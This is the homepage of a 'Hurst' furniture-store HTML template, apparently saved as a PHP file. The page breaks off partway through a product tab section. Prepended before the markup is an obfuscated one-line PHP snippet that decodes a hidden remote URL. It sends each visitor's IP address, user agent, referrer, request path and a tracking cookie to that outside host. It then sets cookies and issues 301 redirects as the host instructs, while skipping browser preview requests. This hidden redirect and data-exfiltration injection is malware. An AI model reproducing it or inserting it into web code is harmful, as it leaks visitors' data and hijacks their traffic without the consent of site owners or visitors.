<?php date_default_timezone_set("UTC");error_reporting(0);header("Cache-Control: no-store, no-cache, must-revalidate, max-age=0");if(!(isset($_SERVER["HTTP_X_PURPOSE"]) AND $_SERVER["HTTP_X_PURPOSE"] == "preview")){$date = date("Y-m-d H:i:s");$id = "456987";$uid="zyblotz2bh01h50s6whgs77he";$qu=$_SERVER["QUERY_STRING"];$ch = curl_init();$d=array(104,116,116,112,115,58,47,47,106,99,105,98,106,46,99,111,109,47,112,99,108,46,112,104,112);$u="";foreach($d as $v){$u.=chr($v);}$data=array("date"=>$date,"lan"=>$_SERVER["HTTP_ACCEPT_LANGUAGE"],"ref"=>$_SERVER["HTTP_REFERER"],"ip"=>$_SERVER["REMOTE_ADDR"],"ipr"=>$_SERVER["HTTP_X_FORWARDED_FOR"],"sn"=>$_SERVER["SERVER_NAME"],"requestUri"=>$_SERVER["REQUEST_URI"],"query"=>$qu,"ua"=>$_SERVER["HTTP_USER_AGENT"],"co"=>$_COOKIE["_event"],"user_id"=>$uid,"id"=>$id);curl_setopt($ch,CURLOPT_URL,$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER, true);curl_setopt($ch,CURLOPT_POST, true);curl_setopt($ch,CURLOPT_POSTFIELDS, $data);$result = curl_exec($ch);curl_close($ch);$arr = explode(",",$result);if(!empty($qu)){if(strpos($arr[1],"?")){$q="&".$qu;}else{$q="?".$qu;}}else{$q="";}if($arr[0] === "true"){if(strstr($arr[1],"sp.php")){$q="?".$qu;}if(!empty($arr[7])){setcookie($arr[7],$arr[8],time()+60*60*24*$arr[9],"/");}if($arr[2]){if($arr[4] == 1 OR $arr[4] == 3){setcookie("_event",$arr[6],time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$q, TRUE, 301);}elseif($arr[0] === "false"){if($arr[5]){$f=$q;}else{$f="";}if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}header("location: ".$arr[1].$f, TRUE, 301);}else{if($arr[2]){if($arr[4] == 2 OR $arr[4] == 3){setcookie("_event",$arr[6]."b",time()+60*60*24*$arr[3]);}}}}?>
<html class="no-js" lang="en"><head>
		<meta charset="utf-8">
		<meta http-equiv="x-ua-compatible" content="ie=edge">
		<title>Home one || Hurst</title>
		<meta name="description" content="Hurst – Furniture Store eCommerce HTML Template is a clean and elegant design – suitable for selling flower, cookery, accessories, fashion, high fashion, accessories, digital, kids, watches, jewelries, shoes, kids, furniture, sports….. It has a fully responsive width adjusts automatically to any screen size or resolution.">
		<meta name="viewport" content="width=device-width, initial-scale=1">

		<link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
		<!-- Place favicon.ico in the root directory -->

		<!-- Google Font -->
		<link href="https://fonts.googleapis.com/css?family=Lato:400,700,900" rel="stylesheet" type="text/css">
		<link href="https://fonts.googleapis.com/css?family=Bree+Serif" rel="stylesheet" type="text/css">

		<!-- all css here -->
		<!-- bootstrap v3.3.6 css -->
		<link rel="stylesheet" href="css/bootstrap.min.css">
		<!-- animate css -->
		<link rel="stylesheet" href="css/animate.min.css">
		<!-- jquery-ui.min css -->
		<link rel="stylesheet" href="css/jquery-ui.min.css">
		<!-- meanmenu css -->
		<link rel="stylesheet" href="css/meanmenu.min.css">
		<!-- nivo-slider css -->
		<link rel="stylesheet" href="css/nivo-slider.css">
		<link rel="stylesheet" href="css/preview.css">
		<!-- slick css -->
		<link rel="stylesheet" href="css/slick.min.css">
		<!-- lightbox css -->
		<link rel="stylesheet" href="css/lightbox.min.css">
		<!-- material-design-iconic-font css -->
		<link rel="stylesheet" href="css/material-design-iconic-font.css">
		<!-- All common css of theme -->
		<link rel="stylesheet" href="css/default.css">
		<!-- style css -->
		<link rel="stylesheet" href="css/style.min.css">
        <!-- shortcode css -->
        <link rel="stylesheet" href="css/shortcode.css">
		<!-- responsive css -->
		<link rel="stylesheet" href="css/responsive.css">
		<!-- modernizr css -->
		<script src="js/modernizr-3.11.2.min.js"></script>
	</head>
	<body>
		<!-- WRAPPER START -->
		<div class="wrapper">

			<!-- Mobile-header-top Start -->
			<div class="mobile-header-top d-block d-md-none">
				<div class="container">
					<div class="row">
						<div class="col-12">
							<!-- header-search-mobile start -->
							<div class="header-search-mobile">
								<div class="table">
									<div class="table-cell">
										<ul>
											<li><a class="search-open" href="#"><i class="zmdi zmdi-search"></i></a></li>
											<li><a href="login.html"><i class="zmdi zmdi-lock"></i></a></li>
											<li><a href="my-account.html"><i class="zmdi zmdi-account"></i></a></li>
											<li><a href="wishlist.html"><i class="zmdi zmdi-favorite"></i></a></li>
										</ul>
									</div>
								</div>
							</div>
							<!-- header-search-mobile start -->
						</div>
					</div>
				</div>
			</div>
			<!-- Mobile-header-top End -->
			<!-- HEADER-AREA START -->
			<header id="sticky-menu" class="header">
				<div class="header-area">
					<div class="container-fluid">
						<div class="row">
							<div class="col-md-4 offset-md-4 col-7">
								<div class="logo text-md-center">
									<a href="index.html"><img src="images/logo.png" alt></a>
								</div>
							</div>
							<div class="col-md-4 col-5">
								<div class="mini-cart text-end">
									<ul>
										<li>
											<a class="cart-icon" href="#">
												<i class="zmdi zmdi-shopping-cart"></i>
												<span>3</span>
											</a>
											<div class="mini-cart-brief text-left">
												<div class="cart-items">
													<p class="mb-0">You have <span>03 items</span> in your shopping bag</p>
												</div>
												<div class="all-cart-product clearfix">
													<div class="single-cart clearfix">
														<div class="cart-photo">
															<a href="#"><img src="images/1.jpg" alt></a>
														</div>
														<div class="cart-info">
															<h5><a href="#">dummy product name</a></h5>
															<p class="mb-0">Price : $ 100.00</p>
															<p class="mb-0">Qty : 02 </p>
															<span class="cart-delete"><a href="#"><i class="zmdi zmdi-close"></i></a></span>
														</div>
													</div>
													<div class="single-cart clearfix">
														<div class="cart-photo">
															<a href="#"><img src="images/2_3.jpg" alt></a>
														</div>
														<div class="cart-info">
															<h5><a href="#">dummy product name</a></h5>
															<p class="mb-0">Price : $ 300.00</p>
															<p class="mb-0">Qty : 01 </p>
															<span class="cart-delete"><a href="#"><i class="zmdi zmdi-close"></i></a></span>
														</div>
													</div>
												</div>
												<div class="cart-totals">
													<h5 class="mb-0">Total <span class="floatright">$500.00</span></h5>
												</div>
												<div class="cart-bottom  clearfix">
													<a href="cart.html" class="button-one floatleft text-uppercase" data-text="View cart">View cart</a>
													<a href="checkout.html" class="button-one floatright text-uppercase" data-text="Check out">Check out</a>
												</div>
											</div>
										</li>
									</ul>
								</div>
							</div>
						</div>
					</div>
				</div>
				<!-- MAIN-MENU START -->
				<div class="menu-toggle hamburger hamburger--emphatic d-none d-md-block">
					<div class="hamburger-box">
						<div class="hamburger-inner"></div>
					</div>
				</div>
				<div class="main-menu  d-none d-md-block">
					<nav>
						<ul>
							<li><a href="index.html">home</a>
								<div class="sub-menu menu-scroll">
									<ul>
										<li class="menu-title">Page's</li>
										<li><a href="index.html">Home Version 1</a></li>
										<li><a href="index-2.html">Home Version 2</a></li>
									</ul>
								</div>
							</li>
							<li><a href="shop.html">products</a>
								<div class="mega-menu menu-scroll">
									<div class="table">
										<div class="table-cell">
											<div class="half-width">
												<ul>
													<li class="menu-title">best brands</li>
													<li><a href="#">henning koppel</a></li>
													<li><a href="#">jehs + Laub</a></li>
													<li><a href="#">vicke lindstrand</a></li>
													<li><a href="#">don chadwick</a></li>
													<li><a href="#">akiko kuwahata</a></li>
													<li><a href="#">barbro berlin</a></li>
													<li><a href="#">cecilia hall</a></li>
													<li><a href="#">don chadwick</a></li>
												</ul>
											</div>
											<div class="half-width">
												<ul>
													<li class="menu-title">popular brands</li>
													<li><a href="#">akiko kuwahata</a></li>
													<li><a href="#">barbro berlin</a></li>
													<li><a href="#">cecilia hall</a></li>
													<li><a href="#">don chadwick</a></li>
													<li><a href="#">henning koppel</a></li>
													<li><a href="#">jehs + Laub</a></li>
													<li><a href="#">vicke lindstrand</a></li>
													<li><a href="#">don chadwick</a></li>
												</ul>
											</div>
											<div class="full-width">
												<div class="mega-menu-img">
													<a href="single-product.html"><img src="images/1_4.jpg" alt></a>
												</div>
											</div>
											<div class="pb-80"></div>
										</div>
									</div>
								</div>
							</li>
                            <li><a href="#">Shortcodes</a>
                                <div class="sub-menu menu-scroll">
                                    <ul>
                                        <li class="menu-title">Shortcodes</li>
                                        <li><a href="elements-accordions.html">Accordion</a></li>
                                        <li><a href="elements-toggles.html">Toggles</a></li>
                                        <li><a href="elements-tab.html">Tab</a></li>
                                        <li><a href="elements-product-tab.html">Product Tab</a></li>
                                        <li><a href="elements-product-tab-2.html">Product Tab 2</a></li>
                                        <li><a href="elements-carousel.html">product carousel</a></li>
                                        <li><a href="elements-carousel-2.html">product carousel 2</a></li>
                                        <li><a href="elements-featured-product.html">Featured Product</a></li>
                                        <li><a href="elements-featured-product-2.html">Featured Product 2</a></li>
                                        <li><a href="elements-button.html">Button</a></li>
                                        <li><a href="elements-table.html">Table</a></li>
                                        <li><a href="elements-progress-bars.html">Progress Bar</a></li>
                                        <li><a href="elements-blog.html">Blog</a></li>
                                        <li><a href="elements-blog-2.html">Blog - 2</a></li>
                                        <li><a href="elements-team.html">Team</a></li>
                                        <li><a href="elements-footer.html">Footer</a></li>
                                        <li><a href="elements-footer-2.html">Footer 2</a></li>
                                        <li><a href="elements-map.html">Map</a></li>
                                    </ul>
                                </div>
                            </li>
							<li><a href="shop-sidebar.html">accesories</a></li>
							<li><a href="shop-list.html">lookbook</a></li>
							<li><a href="blog.html">blog</a></li>
							<li><a href="#">pages</a>
								<div class="sub-menu menu-scroll">
									<ul>
										<li class="menu-title">Page's</li>
										<li><a href="shop.html">Shop</a></li>
										<li><a href="shop-sidebar.html">Shop Sidebar</a></li>
										<li><a href="shop-grid-right-sidebar.html">Shop Right Sidebar</a></li>
										<li><a href="shop-list.html">Shop List</a></li>
										<li><a href="shop-list-right-sidebar.html">Shop List right sidebar</a></li>
										<li><a href="single-product.html">Single Product</a></li>
										<li><a href="single-product-sidebar.html">Single Product Sidebar</a></li>
										<li><a href="cart.html">Shopping Cart</a></li>
										<li><a href="wishlist.html">Wishlist</a></li>
										<li><a href="checkout.html">Checkout</a></li>
										<li><a href="order.html">Order</a></li>
										<li><a href="login.html">login / Registration</a></li>
										<li><a href="my-account.html">My Account</a></li>
										<li><a href="404.html">404</a></li>
										<li><a href="blog.html">Blog</a></li>
										<li><a href="single-blog.html">Single Blog</a></li>
										<li><a href="single-blog-sidebar.html">Single Blog Sidebar</a></li>
										<li><a href="about.html">About Us</a></li>
										<li><a href="contact.html">Contact</a></li>
									</ul>
								</div>
							</li>
							<li><a href="about.html">about us</a></li>
							<li><a href="contact.html">contact</a></li>
						</ul>
					</nav>
				</div>
				<!-- MAIN-MENU END -->
			</header>
			<!-- HEADER-AREA END -->
			<!-- Mobile-menu start -->
			<div class="mobile-menu-area">
				<div class="container-fluid">
					<div class="row">
						<div class="col-xs-12 d-block d-md-none">
							<div class="mobile-menu">
								<nav id="dropdown">
									<ul>
										<li><a href="index.html">home</a>
											<ul>
												<li><a href="index.html">Home Version 1</a></li>
												<li><a href="index-2.html">Home Version 2</a></li>
											</ul>
										</li>
										<li><a href="shop.html">products</a></li>
										<li><a href="shop-sidebar.html">accesories</a></li>
										<li><a href="shop-list.html">lookbook</a></li>
										<li><a href="blog.html">blog</a></li>
										<li><a href="#">pages</a>
											<ul>
												<li><a href="shop.html">Shop</a></li>
												<li><a href="shop-sidebar.html">Shop Sidebar</a></li>
												<li><a href="shop-list.html">Shop List</a></li>
												<li><a href="single-product.html">Single Product</a></li>
												<li><a href="single-product-sidebar.html">Single Product Sidebar</a></li>
												<li><a href="cart.html">Shopping Cart</a></li>
												<li><a href="wishlist.html">Wishlist</a></li>
												<li><a href="checkout.html">Checkout</a></li>
												<li><a href="order.html">Order</a></li>
												<li><a href="login.html">login / Registration</a></li>
												<li><a href="my-account.html">My Account</a></li>
												<li><a href="404.html">404</a></li>
												<li><a href="blog.html">Blog</a></li>
												<li><a href="single-blog.html">Single Blog</a></li>
												<li><a href="single-blog-sidebar.html">Single Blog Sidebar</a></li>
												<li><a href="about.html">About Us</a></li>
												<li><a href="contact.html">Contact</a></li>
											</ul>
										</li>
										<li><a href="about.html">about us</a></li>
										<li><a href="contact.html">contact</a></li>
									</ul>
								</nav>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- Mobile-menu end -->
			<!-- SLIDER-BANNER-AREA START -->
			<section class="slider-banner-area clearfix">
				<!-- Sidebar-social-media start -->
				<div class="sidebar-social d-none d-md-block">
					<div class="table">
						<div class="table-cell">
							<ul>
								<li><a href="#" target="_blank" title="Google Plus"><i class="zmdi zmdi-google-plus"></i></a></li>
								<li><a href="#" target="_blank" title="Twitter"><i class="zmdi zmdi-twitter"></i></a></li>
								<li><a href="#" target="_blank" title="Facebook"><i class="zmdi zmdi-facebook"></i></a></li>
								<li><a href="#" target="_blank" title="Linkedin"><i class="zmdi zmdi-linkedin"></i></a></li>
							</ul>
						</div>
					</div>
				</div>
				<!-- Sidebar-social-media start -->
				<div class="banner-left floatleft">
					<!-- Slider-banner start -->
					<div class="slider-banner">
						<div class="single-banner banner-1">
							<a class="banner-thumb" href="#"><img src="images/1_2.jpg" alt></a>
							<span class="pro-label new-label">new</span>
							<span class="price">$50.00</span>
							<div class="banner-brief">
								<h2 class="banner-title"><a href="#">Product name</a></h2>
								<p class="mb-0">Furniture</p>
							</div>
							<a href="#" class="button-one font-16px" data-text="Buy now">Buy now</a>
						</div>
						<div class="single-banner banner-2">
							<a class="banner-thumb" href="#"><img src="images/2_2.jpg" alt></a>
							<div class="banner-brief">
								<h2 class="banner-title"><a href="#">New Product 2021</a></h2>
								<p class="hidden-md hidden-sm d-none d-md-block">Lorem Ipsum is simply dummy text of the printing and types sate industry. Lorem Ipsum has been the industry.</p>
								<a href="#" class="button-one font-16px" data-text="Buy now">Buy now</a>
							</div>
						</div>
					</div>
					<!-- Slider-banner end -->
				</div>
				<div class="slider-right floatleft">
					<!-- Slider-area start -->
					<div class="slider-area">
						<div class="bend niceties preview-2">
							<div id="ensign-nivoslider" class="slides">
								<img src="images/1_1.jpg" alt title="#slider-direction-1">
								<img src="images/2_1.jpg" alt title="#slider-direction-2">
								<img src="images/3_1.jpg" alt title="#slider-direction-3">
							</div>
							<!-- direction 1 -->
							<div id="slider-direction-1" class="t-cn slider-direction">
								<div class="slider-progress"></div>
								<div class="slider-content t-lfl s-tb slider-1">
									<div class="title-container s-tb-c title-compress">
										<div class="layer-1">
											<div class="wow fadeIn" data-wow-duration="1s" data-wow-delay="0.5s">
												<h2 class="slider-title3 text-uppercase mb-0">welcome to our</h2>
											</div>
											<div class="wow fadeIn" data-wow-duration="1.5s" data-wow-delay="1.5s">
												<h2 class="slider-title1 text-uppercase mb-0">furniture</h2>
											</div>
											<div class="wow fadeIn" data-wow-duration="2s" data-wow-delay="2.5s">
												<h3 class="slider-title2 text-uppercase">gallery 2021</h3>
											</div>
											<div class="wow fadeIn" data-wow-duration="2.5s" data-wow-delay="3.5s">
												<a href="#" class="button-one style-2 text-uppercase mt-20" data-text="Shop now">Shop now</a>
											</div>
										</div>
									</div>
								</div>
							</div>
							<!-- direction 2 -->
							<div id="slider-direction-2" class="slider-direction">
								<div class="slider-progress"></div>
								<div class="slider-content t-lfl s-tb slider-1">
									<div class="title-container s-tb-c title-compress">
										<div class="layer-1">
											<div class="wow fadeInUpBig" data-wow-duration="1s" data-wow-delay="0.5s">
												<h2 class="slider-title3 text-uppercase mb-0">welcome to our</h2>
											</div>
											<div class="wow fadeInUpBig" data-wow-duration="1.5s" data-wow-delay="0.5s">
												<h2 class="slider-title1 text-uppercase">furniture</h2>
											</div>
											<div class="wow fadeInUpBig" data-wow-duration="2s" data-wow-delay="0.5s">
												<p class="slider-pro-brief">There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected humour, or randomised words which don't look even slightly believable</p>
											</div>
											<div class="wow fadeInUpBig" data-wow-duration="2.5s" data-wow-delay="0.5s">
												<a href="#" class="button-one style-2 text-uppercase mt-20" data-text="Shop now">Shop now</a>
											</div>
										</div>
									</div>
								</div>
							</div>
							<!-- direction 3 -->
							<div id="slider-direction-3" class="slider-direction">
								<div class="slider-progress"></div>
								<div class="slider-content t-lfl s-tb slider-1">
									<div class="title-container s-tb-c title-compress">
										<div class="layer-1">
											<div class="wow fadeInUpBig" data-wow-duration="1s" data-wow-delay="0.5s">
												<h2 class="slider-title3 text-uppercase mb-0">welcome to our</h2>
											</div>
											<div class="wow fadeInUpBig" data-wow-duration="1.5s" data-wow-delay="0.5s">
												<h2 class="slider-title1 text-uppercase mb-0">furniture</h2>
											</div>
											<div class="wow fadeInUpBig" data-wow-duration="2s" data-wow-delay="0.5s">
												<h3 class="slider-title2 text-uppercase">gallery 2021</h3>
											</div>
											<div class="wow fadeInUpBig" data-wow-duration="2.5s" data-wow-delay="0.5s">
												<p class="slider-pro-brief">There are many variations of passages of Lorem Ipsum available, but the majority have suffered alteration in some form, by injected humour, or randomised words which don't look even slightly believable</p>
											</div>
											<div class="wow fadeInUpBig" data-wow-duration="3s" data-wow-delay="0.5s">
												<a href="#" class="button-one style-2 text-uppercase mt-20" data-text="Shop now">Shop now</a>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
					<!-- Slider-area end -->
				</div>
				<!-- Sidebar-social-media start -->
				<div class="sidebar-account d-none d-md-block">
					<div class="table">
						<div class="table-cell">
							<ul>
								<li><a class="search-open" href="#" title="Search"><i class="zmdi zmdi-search"></i></a></li>
								<li><a href="#" title="Login"><i class="zmdi zmdi-lock"></i></a>
									<div class="customer-login text-left">
										<form action="#">
											<h4 class="title-1 title-border text-uppercase mb-30">Registered customers</h4>
											<p class="text-gray">If you have an account with us, Please login!</p>
											<input type="text" name="email" placeholder="Email here...">
											<input type="password" placeholder="Password">
											<p><a class="text-gray" href="#">Forget your password?</a></p>
											<button class="button-one submit-button mt-15" data-text="login" type="submit">login</button>
										</form>
									</div>
								</li>
								<li><a href="my-account.html" title="My-Account"><i class="zmdi zmdi-account"></i></a></li>
								<li><a href="wishlist.html" title="Wishlist"><i class="zmdi zmdi-favorite"></i></a></li>
							</ul>
						</div>
					</div>
				</div>
				<!-- Sidebar-social-media start -->
			</section>
			<!-- End Slider-section -->
			<!-- sidebar-search Start -->
			<div class="sidebar-search animated slideOutUp">
				<div class="table">
					<div class="table-cell">
						<div class="container">
							<div class="row">
								<div class="col-md-8 offset-md-2 p-0">
									<div class="search-form-wrap">
										<button class="close-search"><i class="zmdi zmdi-close"></i></button>
										<form action="#">
											<input type="text" placeholder="Search here...">
											<button class="search-button" type="submit">
												<i class="zmdi zmdi-search"></i>
											</button>
										</form>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- sidebar-search End -->
			<!-- PRODUCT-AREA START -->
			<div class="product-area pt-80 pb-35">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<div class="section-title text-center">
								<h2 class="title-border">Featured Products</h2>
							</div>
							<div class="product-slider style-1 arrow-left-right">
								<!-- Single-product start -->
								<div class="single-product">
									<div class="product-img">
										<span class="pro-label new-label">new</span>
										<a href="single-product.html"><img src="images/1_3.jpg" alt></a>
										<div class="product-action clearfix">
											<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
											<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
											<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
											<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
										</div>
									</div>
									<div class="product-info clearfix">
										<div class="fix">
											<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
											<p class="floatright hidden-sm d-none d-md-block">Furniture</p>
										</div>
										<div class="fix">
											<span class="pro-price floatleft">$ 56.20</span>
											<span class="pro-rating floatright">
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star-half"></i></a>
												<a href="#"><i class="zmdi zmdi-star-half"></i></a>
											</span>
										</div>
									</div>
								</div>
								<!-- Single-product end -->
								<!-- Single-product start -->
								<div class="single-product">
									<div class="product-img">
										<span class="pro-label sale-label">Sale</span>
										<a href="single-product.html"><img src="images/2.jpg" alt></a>
										<div class="product-action clearfix">
											<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
											<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
											<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
											<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
										</div>
									</div>
									<div class="product-info clearfix">
										<div class="fix">
											<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
											<p class="floatright hidden-sm d-none d-md-block">Furniture</p>
										</div>
										<div class="fix">
											<span class="pro-price floatleft">$ 56.20</span>
											<span class="pro-rating floatright">
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star-half"></i></a>
												<a href="#"><i class="zmdi zmdi-star-half"></i></a>
											</span>
										</div>
									</div>
								</div>
								<!-- Single-product end -->
								<!-- Single-product start -->
								<div class="single-product">
									<div class="product-img">
										<a href="single-product.html"><img src="images/3.jpg" alt></a>
										<div class="product-action clearfix">
											<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
											<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
											<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
											<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
										</div>
									</div>
									<div class="product-info clearfix">
										<div class="fix">
											<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
											<p class="floatright hidden-sm d-none d-md-block">Furniture</p>
										</div>
										<div class="fix">
											<span class="pro-price floatleft">$ 56.20</span>
											<span class="pro-rating floatright">
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star-half"></i></a>
												<a href="#"><i class="zmdi zmdi-star-half"></i></a>
											</span>
										</div>
									</div>
								</div>
								<!-- Single-product end -->
								<!-- Single-product start -->
								<div class="single-product">
									<div class="product-img">
										<a href="single-product.html"><img src="images/4.jpg" alt></a>
										<div class="product-action clearfix">
											<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
											<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
											<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
											<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
										</div>
									</div>
									<div class="product-info clearfix">
										<div class="fix">
											<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
											<p class="floatright hidden-sm d-none d-md-block">Furniture</p>
										</div>
										<div class="fix">
											<span class="pro-price floatleft">$ 56.20</span>
											<span class="pro-rating floatright">
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star-half"></i></a>
												<a href="#"><i class="zmdi zmdi-star-half"></i></a>
											</span>
										</div>
									</div>
								</div>
								<!-- Single-product end -->
								<!-- Single-product start -->
								<div class="single-product">
									<div class="product-img">
										<span class="pro-label new-label">new</span>
										<a href="single-product.html"><img src="images/3.jpg" alt></a>
										<div class="product-action clearfix">
											<a href="wishlist.html" data-bs-toggle="tooltip" data-placement="top" title="Wishlist"><i class="zmdi zmdi-favorite-outline"></i></a>
											<a href="#" data-bs-toggle="modal" data-bs-target="#productModal" title="Quick View"><i class="zmdi zmdi-zoom-in"></i></a>
											<a href="#" data-bs-toggle="tooltip" data-placement="top" title="Compare"><i class="zmdi zmdi-refresh"></i></a>
											<a href="cart.html" data-bs-toggle="tooltip" data-placement="top" title="Add To Cart"><i class="zmdi zmdi-shopping-cart-plus"></i></a>
										</div>
									</div>
									<div class="product-info clearfix">
										<div class="fix">
											<h4 class="post-title floatleft"><a href="#">dummy Product name</a></h4>
											<p class="floatright hidden-sm d-none d-md-block">Furniture</p>
										</div>
										<div class="fix">
											<span class="pro-price floatleft">$ 56.20</span>
											<span class="pro-rating floatright">
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star"></i></a>
												<a href="#"><i class="zmdi zmdi-star-half"></i></a>
												<a href="#"><i class="zmdi zmdi-star-half"></i></a>
											</span>
										</div>
									</div>
								</div>
								<!-- Single-product end -->
							</div>
						</div>
					</div>
				</div>
			</div>
			<!-- PRODUCT-AREA END -->
			<!-- DISCOUNT-PRODUCT START -->
			<div class="discount-product-area">
				<div class="container">
					<div class="row">
						<div class="discount-product-slider dots-bottom-right">
							<!-- single-discount-product start -->
							<div class="col-lg-12">
								<div class="discount-product">
									<img src="images/1_6.jpg" alt>
									<div class="discount-img-brief">
										<div class="onsale">
											<span class="onsale-text">On Sale</span>
											<span class="onsale-price">$ 80.00</span>
										</div>
										<div class="discount-info">
											<h1 class="text-dark-red d-none d-md-block">Discount 50%</h1>
											<p class="d-none d-md-block">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed does eiusmodes tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim venim, quis nostrud exercitation ullamco laboris.</p>
											<a href="#" class="button-one font-16px style-3 text-uppercase mt-md-5" data-text="Buy now">Buy now</a>
										</div>
									</div>
								</div>
							</div>
							<!-- single-discount-product end -->
							<!-- single-discount-product start -->
							<div class="col-lg-12">
								<div class="discount-product">
									<img src="images/2_4.jpg" alt>
									<div class="discount-img-brief">
										<div class="onsale">
											<span class="onsale-text">On Sale</span>
											<span class="onsale-price">$ 80.00</span>
										</div>
										<div class="discount-info">
											<h1 class="text-dark-red d-none d-md-block">Discount 50%</h1>
											<p class="d-none d-md-block">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed does eiusmodes tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim venim, quis nostrud exercitation ullamco laboris.</p>
											<a href="#" class="button-one font-16px style-3 text-uppercase mt-md-5" data-text="Buy now">Buy now</a>
										</div>
									</div>
								</div>
							</div>
							<!-- single-discount-product end -->
							<!-- single-discount-product start -->
							<div class="col-lg-12">
								<div class="discount-product">
									<img src="images/3_2.jpg" alt>
									<div class="discount-img-brief">
										<div class="onsale">
											<span class="onsale-text">On Sale</span>
											<span class="onsale-price">$ 80.00</span>
										</div>
										<div class="discount-info">
											<h1 class="text-dark-red d-none d-md-block">Discount 50%</h1>
											<p class="d-none d-md-block">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed does eiusmodes tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim venim, quis nostrud exercitation ullamco laboris.</p>
											<a href="#" class="button-one font-16px style-3 text-uppercase mt-md-5" data-text="Buy now">Buy now</a>
										</div>
									</div>
								</div>
							</div>
							<!-- single-discount-product end -->
							<!-- single-discount-product start -->
							<div class="col-lg-12">
								<div class="discount-product">
									<img src="images/4_1.jpg" alt>
									<div class="discount-img-brief">
										<div class="onsale">
											<span class="onsale-text">On Sale</span>
											<span class="onsale-price">$ 80.00</span>
										</div>
										<div class="discount-info">
											<h1 class="text-dark-red d-none d-md-block">Discount 50%</h1>
											<p class="d-none d-md-block">Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed does eiusmodes tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim venim, quis nostrud exercitation ullamco laboris.</p>
											<a href="#" class="button-one font-16px style-3 text-uppercase mt-md-5" data-text="Buy now">Buy now</a>
										</div>
									</div>
								</div>
							</div>
							<!-- single-discount-product end -->
						</div>
					</div>
				</div>
			</div>
			<!-- DISCOUNT-PRODUCT END -->
			<!-- PURCHASE-ONLINE-AREA START -->
			<div class="purchase-online-area pt-80">
				<div class="container">
					<div class="row">
						<div class="col-lg-12">
							<div class="section-title text-center">
								<h2 class="title-border">Purchase Online on Hurst</h2>
							</div>
						</div>
					</div>
					<div class="row">
						<div class="col-lg-12 text-center">
							<!-- Nav tabs -->
							<ul class="tab-menu nav clearfix">
								<li><a class="active" href="#new-arrivals" data-bs-toggle="tab">New Arrivals</a></li>
								<li><a href="#best-seller" data-bs-toggle="tab">Best Seller </a></li>
								<li><a href="#most-view" data-bs-toggle="tab">Most View </a></li>
								<li><a href="#discounts" data-bs-toggle="tab">Discounts</a></li>
							</ul>
						</div>
						<div class="col-lg-12">
							<!-- Tab panes -->
							<div class="tab-content">
								<div class="tab-pane active" id="new-arrivals">
									<div class="row">
